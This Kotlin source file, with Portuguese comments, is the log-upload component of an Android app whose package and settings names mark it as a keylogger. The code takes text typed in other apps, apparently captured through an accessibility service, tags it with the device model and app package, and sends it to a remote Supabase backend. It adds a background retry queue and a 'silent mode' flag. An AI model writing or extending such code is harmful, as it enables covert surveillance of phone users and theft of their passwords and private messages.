package com.seuempresa.redmikeylg

import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import android.util.Log
import com.seuempresa.redmikeylg.data.KeyLogEntry
import com.seuempresa.redmikeylg.utils.SupabaseExtensions.insertKeyLog
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import java.util.concurrent.ConcurrentLinkedQueue
import java.util.concurrent.atomic.AtomicBoolean

/**
 * LogManager — Gerenciador de envio de logs diretamente ao Supabase via Coroutines.
 *
 * Principais funcionalidades e melhorias de arquitetura:
 *  1. Usa [KeyLogEntry] e a função de extensão [insertKeyLog].
 *  2. Fila em memória resiliente ([retryQueue]) para logs que falharem no envio inicial.
 *  3. Processamento em lote periódico ([processQueue]) rodando em background com Dispatchers.IO.
 *  4. Sem bloqueio de UI ou de threads do sistema/AccessibilityService.
 *  5. Limite máximo no tamanho da fila para proteção contra exaustão de memória.
 *  6. Logs de depuração (Log.d) cobrindo sucessos e falhas de envio.
 */
object LogManager {

    private const val TAG = "LogManager"
    private const val PREFS_NAME = "redmi_keylogger_prefs"
    private const val PREF_SERVER_IP = "server_ip"
    private const val PREF_API_KEY = "api_key"
    private const val PREF_SILENT_MODE = "silent_mode"
    private const val DEFAULT_IP = "192.168.1.100:5000"

    private const val MAX_QUEUE_CAPACITY = 1_000
    private const val MAX_INPUT_LENGTH = 1_000
    private const val PROCESS_QUEUE_INTERVAL_MS = 5_000L

    /**
     * Escopo assíncrono supervisionado dedicado para I/O de logs no Supabase.
     */
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    /**
     * Fila em memória para retenção e reenvio de logs em caso de falha de conexão.
     */
    private val retryQueue = ConcurrentLinkedQueue<KeyLogEntry>()

    /**
     * Mutex para evitar execuções concorrentes do processQueue.
     */
    private val queueMutex = Mutex()

    private val isQueueProcessorRunning = AtomicBoolean(false)
    private val isShutdown = AtomicBoolean(false)

    // ── API pública de logging ───────────────────────────────────────────────

    /**
     * Enfileira/envia um log de digitação para o Supabase de forma assíncrona.
     */
    fun log(context: Context, appPackage: String, input: String) {
        if (isShutdown.get()) return

        // Inicia o job periódico de retryQueue caso ainda não esteja rodando
        ensureQueueProcessorStarted()

        val apiKey = getApiKey(context)
        val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"

        val safeInput = if (input.length > MAX_INPUT_LENGTH) {
            input.take(MAX_INPUT_LENGTH) + "…[truncado]"
        } else {
            input
        }

        val logEntry = KeyLogEntry(
            deviceModel = deviceModel,
            appPackage = appPackage,
            inputContent = safeInput,
            apiKey = apiKey
        )

        // Dispara envio sem travar a UI ou o AccessibilityService
        scope.launch {
            try {
                insertKeyLog(logEntry)
                Log.d(TAG, "Log enviado com sucesso para o Supabase: [${logEntry.appPackage}]")
            } catch (e: Exception) {
                Log.d(TAG, "Falha ao enviar log para o Supabase: ${e.message}. Adicionando à fila local.")
                enqueueForRetry(logEntry)
            }
        }
    }

    /**
     * Adiciona um log à fila local para reprocessamento posterior caso o envio falhe.
     */
    private fun enqueueForRetry(entry: KeyLogEntry) {
        if (retryQueue.size >= MAX_QUEUE_CAPACITY) {
            Log.d(TAG, "Capacidade máxima da fila atingida ($MAX_QUEUE_CAPACITY). Descartando o mais antigo.")
            retryQueue.poll()
        }
        retryQueue.offer(entry)
        Log.d(TAG, "Item enfileirado na fila local de retry. Tamanho atual: ${retryQueue.size}")
    }

    /**
     * Processa a fila de logs acumulados em memória e tenta reenviá-los ao Supabase.
     * Pode ser invocado periodicamente ou em resposta a eventos de conectividade.
     */
    suspend fun processQueue() {
        if (retryQueue.isEmpty()) return

        queueMutex.withLock {
            val pendingCount = retryQueue.size
            if (pendingCount == 0) return@withLock

            Log.d(TAG, "Processando fila de retentativas: $pendingCount itens pendentes.")
            val failedAgain = mutableListOf<KeyLogEntry>()

            while (retryQueue.isNotEmpty()) {
                val entry = retryQueue.poll() ?: break
                try {
                    insertKeyLog(entry)
                    Log.d(TAG, "Item da fila reenviado com sucesso: [${entry.appPackage}]")
                } catch (e: Exception) {
                    Log.d(TAG, "Falha na retentativa para [${entry.appPackage}]: ${e.message}")
                    failedAgain.add(entry)
                    // Se falhou novamente, provavelmente ainda está sem conexão; re-enfileira e aguarda o próximo ciclo
                    break
                }
            }

            // Reinsere os que ainda não foram possíveis enviar
            if (failedAgain.isNotEmpty()) {
                failedAgain.forEach { retryQueue.offer(it) }
            }
        }
    }

    private fun ensureQueueProcessorStarted() {
        if (isQueueProcessorRunning.compareAndSet(false, true)) {
            scope.launch {
                while (isActive && !isShutdown.get()) {
                    delay(PROCESS_QUEUE_INTERVAL_MS)
                    try {
                        processQueue()
                    } catch (e: Exception) {
                        Log.d(TAG, "Erro no loop de processamento da fila: ${e.message}")
                    }
                }
            }
            Log.d(TAG, "Loop periódico do processQueue iniciado com intervalo de ${PROCESS_QUEUE_INTERVAL_MS}ms.")
        }
    }

    /**
     * Encerra as coroutines e rotinas em background.
     */
    fun shutdown() {
        if (!isShutdown.compareAndSet(false, true)) return
        scope.cancel()
        Log.d(TAG, "LogManager finalizado e CoroutineScope cancelado.")
    }

    // ── Configurações (SharedPreferences) ─────────────────────────────────────

    fun saveConfig(context: Context, serverIp: String, apiKey: String) {
        getPrefs(context).edit()
            .putString(PREF_SERVER_IP, serverIp.trim())
            .putString(PREF_API_KEY, apiKey.trim())
            .apply()
    }

    fun getServerIp(context: Context): String =
        getPrefs(context).getString(PREF_SERVER_IP, DEFAULT_IP) ?: DEFAULT_IP

    fun getApiKey(context: Context): String =
        getPrefs(context).getString(PREF_API_KEY, "") ?: ""

    // ── Modo Silencioso ───────────────────────────────────────────────────────

    fun isSilentMode(context: Context): Boolean =
        getPrefs(context).getBoolean(PREF_SILENT_MODE, false)

    fun setSilentMode(context: Context, enabled: Boolean) {
        getPrefs(context).edit()
            .putBoolean(PREF_SILENT_MODE, enabled)
            .apply()
    }

    fun getPrefs(context: Context): SharedPreferences =
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
}
